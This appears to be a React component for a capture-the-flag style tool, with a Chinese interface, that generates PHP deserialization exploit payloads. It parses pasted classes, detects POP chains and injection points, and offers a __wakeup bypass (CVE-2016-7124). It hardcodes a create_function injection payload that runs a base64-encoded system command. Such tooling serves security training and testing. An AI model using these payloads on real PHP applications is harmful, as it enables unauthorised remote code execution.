import { useMemo, useState } from 'react';
import { Eraser } from 'lucide-react';

import { buildPhpSerialized, detectCreateFunctionHint, detectStringReplaceHint, parsePhpClass } from '@/lib/phpSerialize';
import { analyzePopChain, buildPopChainManualNode, parsePhpClasses } from '@/lib/phpPopChain';
import PopChainEditor from '@/components/tool/PopChainEditor';

/**
 * PHP 反序列化 PoC 交互工作区。
 *
 * 流程：粘贴 PHP 类源码 → 自动识别类属性并生成参数表单 → 用户赋值 →
 * 实时生成 serialize() PoC（含可读版与 URL 编码版）。
 */

const VIS_LABEL: Record<string, string> = {
  public: 'public',
  protected: 'protected',
  private: 'private',
};

const VIS_BADGE: Record<string, string> = {
  public: 'bg-emerald-100 text-emerald-700 dark:bg-emerald-900/30 dark:text-emerald-300',
  protected: 'bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-300',
  private: 'bg-rose-100 text-rose-700 dark:bg-rose-900/30 dark:text-rose-300',
};

export default function PhpUnserializeWorkspace() {
  const [source, setSource] = useState('');
  const [values, setValues] = useState<Record<string, string>>({});
  const [bypassWakeup, setBypassWakeup] = useState(false);

  const parsed = useMemo(() => {
    const s = source.trim();
    if (!s) return null;
    const r = parsePhpClass(s);
    return r.props.length ? r : null;
  }, [source]);

  const result = useMemo(() => {
    if (!parsed) return null;
    return buildPhpSerialized(
      parsed.className,
      parsed.props,
      values,
      bypassWakeup ? parsed.props.length + 1 : undefined,
    );
  }, [parsed, values, bypassWakeup]);

  const stringReplaceHint = useMemo(() => detectStringReplaceHint(source), [source]);

  const classes = useMemo(() => parsePhpClasses(source), [source]);
  const isMultiClass = classes.length > 1;
  const popChain = useMemo(() => analyzePopChain(source), [source]);
  const popChainManualNode = useMemo(() => buildPopChainManualNode(source), [source]);

  const hint = useMemo(() => {
    if (!parsed) return null;
    return detectCreateFunctionHint(source, parsed.props);
  }, [source, parsed]);

  const applyHint = () => {
    if (!hint || !parsed) return;
    const bodyProp = parsed.props.find((p) => p.name !== hint.propName);
    setValues((prev) => ({
      ...prev,
      [hint.propName]: 'create_function',
      ...(bodyProp ? { [bodyProp.name]: '}system(base64_decode("bW9yZSAvZmxhZw=="));//' } : {}),
    }));
  };

  const setProp = (name: string, v: string) => {
    setValues((prev) => ({ ...prev, [name]: v }));
  };

  const handleClear = () => {
    setSource('');
    setValues({});
  };

  const textareaCls =
    'w-full resize-none rounded-lg border border-slate-300 bg-white p-3 font-mono text-sm text-slate-900 outline-none ' +
    'focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 ' +
    'dark:border-slate-700 dark:bg-slate-900 dark:text-slate-100';

  const inputCls =
    'w-full rounded-md border border-slate-300 bg-white px-3 py-2 font-mono text-sm text-slate-900 outline-none ' +
    'focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 ' +
    'dark:border-slate-700 dark:bg-slate-900 dark:text-slate-100';

  const labelCls = 'mb-2 block text-sm font-medium text-slate-700 dark:text-slate-200';

  return (
    <div className="mt-6">
      {/* 源码（全宽） */}
      <div className="space-y-4">
        <div>
          <label className={labelCls}>PHP 类源码</label>
          <textarea
            rows={12}
            value={source}
            onChange={(e) => setSource(e.target.value)}
            placeholder={'粘贴 class 定义，例如：\nclass Noteasy {\n    private $a;\n    private $b;\n    ...\n}'}
            spellCheck={false}
            className={textareaCls}
          />
        </div>

        {stringReplaceHint && (
          <div className="rounded-lg border border-sky-300 bg-sky-50 p-3 dark:border-sky-500/40 dark:bg-sky-500/10">
            <p className="text-sm font-medium text-sky-800 dark:text-sky-200">检测到字符串替换逃逸可能</p>
            <p className="mt-1 text-xs leading-relaxed text-sky-700 dark:text-sky-300">{stringReplaceHint.message}</p>
          </div>
        )}
      </div>

      {isMultiClass ? (
        <div className="mt-4 space-y-4">
          {popChain && (
            <div className="rounded-lg border border-indigo-200 bg-indigo-50 p-3 dark:border-indigo-500/30 dark:bg-indigo-500/10">
              <p className="text-sm font-medium text-indigo-800 dark:text-indigo-200">
                检测到 POP 链（{popChain.entry} → {popChain.sink}，sink：{popChain.sinkFunc}）
              </p>
              <ol className="mt-2 space-y-1 text-xs text-indigo-700 dark:text-indigo-300">
                {popChain.steps.map((s, i) => (
                  <li key={i}>{i + 1}. {s}</li>
                ))}
              </ol>
              <p className="mt-2 text-xs text-indigo-500 dark:text-indigo-400">
                下方为手动编辑器，可完全自定义对象结构与所有参数值。
              </p>
            </div>
          )}
          <PopChainEditor key={source} classes={classes} initialNode={popChainManualNode} />
        </div>
      ) : (
        <div className="mt-6 grid grid-cols-1 gap-6 lg:grid-cols-2">
          <div className="space-y-6">
            {hint && (
              <div className="rounded-lg border border-amber-300 bg-amber-50 p-3 dark:border-amber-500/40 dark:bg-amber-500/10">
                <p className="text-sm font-medium text-amber-800 dark:text-amber-200">检测到 create_function 注入可能</p>
                <p className="mt-1 text-xs leading-relaxed text-amber-700 dark:text-amber-300">{hint.message}</p>
                <button
                  type="button"
                  onClick={applyHint}
                  className="mt-2 rounded-md bg-amber-500 px-3 py-1.5 text-xs font-medium text-white hover:bg-amber-600"
                >
                  一键填入 create_function 示例 payload
                </button>
              </div>
            )}

            {parsed && (
              <div>
                <div className="mb-3 flex items-center justify-between">
                  <label className="text-sm font-medium text-slate-700 dark:text-slate-200">属性参数</label>
                  <span className="rounded-md bg-slate-100 px-2 py-0.5 text-xs text-slate-600 dark:bg-slate-800 dark:text-slate-300">
                    类名：{parsed.className}
                  </span>
                </div>

                <div className="space-y-3">
                  {parsed.props.map((p) => (
                    <div key={p.name}>
                      <label className="mb-1 flex items-center gap-2 text-sm text-slate-600 dark:text-slate-300">
                        <span className="font-mono">${p.name}</span>
                        <span className={`rounded px-1.5 py-0.5 text-[10px] font-medium ${VIS_BADGE[p.visibility]}`}>
                          {VIS_LABEL[p.visibility]}
                        </span>
                      </label>
                      <input
                        value={values[p.name] ?? ''}
                        onChange={(e) => setProp(p.name, e.target.value)}
                        placeholder="填写值（如 system / ls）"
                        spellCheck={false}
                        className={inputCls}
                      />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {parsed && (
              <label className="flex items-center justify-between rounded-lg border border-slate-200 p-3 dark:border-slate-700">
                <div>
                  <span className="text-sm font-medium text-slate-700 dark:text-slate-200">
                    __wakeup() 绕过（CVE-2016-7124）
                  </span>
                  <p className="mt-0.5 text-xs text-slate-400">
                    声明属性个数 +1，旧版 PHP（&lt; 5.6.25 / 7.0.10）跳过 __wakeup()
                  </p>
                </div>
                <button
                  type="button"
                  role="switch"
                  aria-checked={bypassWakeup}
                  onClick={() => setBypassWakeup((v) => !v)}
                  className={`relative inline-flex h-5 w-9 shrink-0 items-center rounded-full transition-colors ${
                    bypassWakeup ? 'bg-indigo-500' : 'bg-slate-300 dark:bg-slate-600'
                  }`}
                >
                  <span
                    className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                      bypassWakeup ? 'translate-x-4' : 'translate-x-0.5'
                    }`}
                  />
                </button>
              </label>
            )}
          </div>

          <div className="space-y-4">
            <div>
              <label className={labelCls}>序列化 PoC（\x00 表示 NUL 字节）</label>
              <textarea
                rows={8}
                value={result?.readable ?? ''}
                readOnly
                placeholder="填写参数后自动生成…"
                spellCheck={false}
                className={`${textareaCls} bg-slate-50 text-slate-700 dark:bg-slate-950 dark:text-slate-300`}
              />
            </div>
            <div>
              <label className={labelCls}>URL 编码</label>
              <textarea
                rows={6}
                value={result?.urlEncoded ?? ''}
                readOnly
                placeholder="URL 编码结果…"
                spellCheck={false}
                className={`${textareaCls} bg-slate-50 text-slate-700 dark:bg-slate-950 dark:text-slate-300`}
              />
            </div>
          </div>
        </div>
      )}

      <div className="mt-4 flex items-center justify-between">
        <p className="text-xs text-slate-400">
          粘贴源码自动识别类属性；多类源码可手动构建 POP 链，单类源码直接填参生成。
        </p>
        <button
          type="button"
          onClick={handleClear}
          className="flex shrink-0 items-center gap-1.5 rounded-md border border-slate-300 px-3 py-1.5 text-sm text-slate-600 hover:bg-slate-50 dark:border-slate-700 dark:text-slate-300 dark:hover:bg-slate-800"
        >
          <Eraser className="h-4 w-4" />
          清空
        </button>
      </div>
    </div>
  );
}
